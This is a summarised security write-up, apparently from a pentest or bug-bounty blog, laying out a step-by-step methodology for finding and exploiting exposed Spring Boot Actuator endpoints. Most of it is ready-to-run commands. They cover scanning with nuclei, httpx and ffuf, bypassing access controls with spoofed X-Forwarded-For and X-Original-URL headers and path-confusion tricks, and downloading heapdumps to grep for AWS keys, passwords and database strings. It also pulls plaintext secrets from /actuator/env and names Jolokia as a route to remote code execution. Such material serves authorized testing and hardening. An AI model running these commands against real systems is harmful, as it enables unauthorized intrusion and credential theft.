# : Actuator Unleashed — Finding and Exploiting Spring Boot Actuator Endpoints
- Source: (Oct 6, 2025) — infosecwriteups.com
- Full methodology for Spring Boot Actuator discovery, bypass, and exploitation

## What is Spring Boot Actuator?
Production-ready monitoring/management HTTP endpoints. When misconfigured and exposed publicly, becomes a critical backdoor.

## Complete Actuator Endpoint List
```bash
# Core endpoints
/actuator                    # Index page
/actuator/health             # Health status
/actuator/info               # Application info
/actuator/env                # Environment properties (SECRETS!)
/actuator/configprops        # Configuration properties
/actuator/beans              # All Spring beans
/actuator/mappings           # Request mapping (API structure)
/actuator/metrics            # Application metrics
/actuator/loggers            # Logger configuration (can change levels)
/actuator/threaddump         # Thread dump
/actuator/heapdump           # Heap dump (CREDENTIALS GOLDMINE!)
/actuator/jolokia            # JMX MBeans (RCE potential!)
/actuator/httptrace          # HTTP request traces
/actuator/sessions           # Active sessions
/actuator/shutdown           # Shutdown application
/actuator/restart            # Restart application
/actuator/prometheus         # Prometheus metrics
```

## Phase 1: Discovery

### Automatic Scanning
```bash
# Nuclei templates for Actuator
nuclei -t exposures/configs/springboot-actuator.yaml -l targets.txt

# httpx probing
httpx -l targets.txt -path /actuator -silent -mc 200,401,403

# ffuf for non-standard paths
ffuf -w paths.txt -u https://target.com/FUZZ -mc 200,401,403 -fs 0
```

### Non-Standard Path Wordlist
```bash
/actuator
/actuator/health
/actuator/info
/management
/management/health
/admin/actuator
/internal/actuator
/api/actuator
/spring/actuator
/actuator-1.0
```

## Phase 2: Access Control Bypass

### Header-Based Bypasses
```bash
# IP spoofing
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/actuator/env
curl -H "X-Real-IP: 127.0.0.1" https://target.com/actuator/env

# URL rewriting (WAF bypass)
curl -H "X-Original-URL: /actuator/env" https://target.com/
curl -H "X-Rewrite-URL: /actuator/env" https://target.com/
curl -H "X-HTTP-Method-Override: GET" https://target.com/actuator/env

# Path confusion
curl https://target.com/actuator/env;.js
curl https://target.com/actuator/env%00
curl https://target.com/actuator/..;/env
```

## Phase 3: Exploitation

### Heapdump Analysis (Credentials Goldmine)
```bash
# Download heapdump
wget https://target.com/actuator/heapdump

# Extract secrets
strings heapdump | grep -i "AKIA"  # AWS keys
strings heapdump | grep -i "password"
strings heapdump | grep -i "secret"
strings heapdump | grep -i "jdbc:"  # DB connection strings

# Using jhat for deeper analysis
jhat heapdump
```

### Jolokia RCE
The `/actuator/jolokia` endpoint exposes JMX MBeans:
- Can reload logback configuration
- Can invoke arbitrary MBean methods
- Potential for RCE via reconfiguring logback with malicious XML

### Env Endpoint Secrets
```bash
# GET - list all env properties (plaintext secrets)
curl https://target.com/actuator/env

# Extract specific values
curl https://target.com/actuator/env/spring.datasource.password
```

## Phase 4: Fuzzing Variations
```bash
# Spring Boot 1.x endpoints (no /actuator prefix)
/env
/health
/info
/dump
/trace
/jolokia
/beans
/configprops

# Path variations
/actuator/
/actuator/env/
/actuator//env
//actuator//env
/actuator/ENV (case variation)
```

## Key Takeaways
1. Even 401/403 responses confirm the endpoint EXISTS — don't stop
2. `/heapdump` and `/env` are the highest-impact endpoints
3. Header-based bypass (X-Forwarded-For, X-Original-URL) works often
4. Jolokia can lead to full RCE via JMX manipulation
5. Fuzz for non-standard base paths — they're common in production
6. Never assume WAF blocking means no actuator present
